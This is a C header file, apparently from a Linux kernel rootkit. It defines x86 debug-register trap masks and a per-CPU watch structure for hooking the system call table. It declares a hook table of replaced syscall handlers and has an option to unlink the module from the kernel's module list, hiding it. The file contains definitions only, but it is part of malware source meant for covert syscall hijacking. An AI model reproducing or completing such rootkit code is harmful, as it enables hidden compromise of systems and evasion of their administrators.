#ifndef __DR_H
#define __DR_H
/*
 * w00h00
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ptrace.h>
#include <linux/errno.h>
#include <linux/user.h>
#include <linux/security.h>
#include <linux/unistd.h>
#include <linux/notifier.h>
#include <linux/cpu.h>

#include <linux/version.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,24)
    #include <asm-i386/debugreg.h>
#else
    #include <asm-x86/debugreg.h>
#endif

#define __SYSENTER_ENABLE__

//#define __UNLINK_LKM__

/* define this if you want (very) verbose kern logs */

//#define __DEBUG__

#ifdef __DEBUG__
    #define DEBUGLOG(a) printk a
#else
    #define DEBUGLOG(a) ""
#endif

#define RETURN_SYSCALL_TABLE    0
#define RETURN_SYSCALL_CALL     1

/*
    Define our trap mask
*/

#define TRAP_GLOBAL_DR0 1<<1
#define TRAP_GLOBAL_DR1 1<<3
#define TRAP_GLOBAL_DR2 1<<5
#define TRAP_GLOBAL_DR3 1<<7

/* exact instruction detection not supported on P6 */
#define TRAP_LE         1<<8
#define TRAP_GE         1<<9

/* Global Detect flag */
#define GD_ACCESS       1<<13

/* 2 bits R/W and 2 bits len from these offsets */
#define DR0_RW      16
#define DR0_LEN     18
#define DR1_RW      20
#define DR1_LEN     22
#define DR2_RW      24
#define DR2_LEN     26
#define DR3_RW      28
#define DR3_LEN     30
/* IA32_SDM_3B.pdf */

/*
    So that we can set our main watch on all cpu's
    in the actual handler we only care about THAT cpu
    so we don't have to set a smp watch there afaik
*/

struct watch {
    unsigned int dr0;
    unsigned int dr1;
    unsigned int dr2;
    unsigned int dr3;
    unsigned int stat;
    unsigned int ctrl;
};

extern unsigned int sys_table_global;
extern void *hook_table[NR_syscalls];

#endif
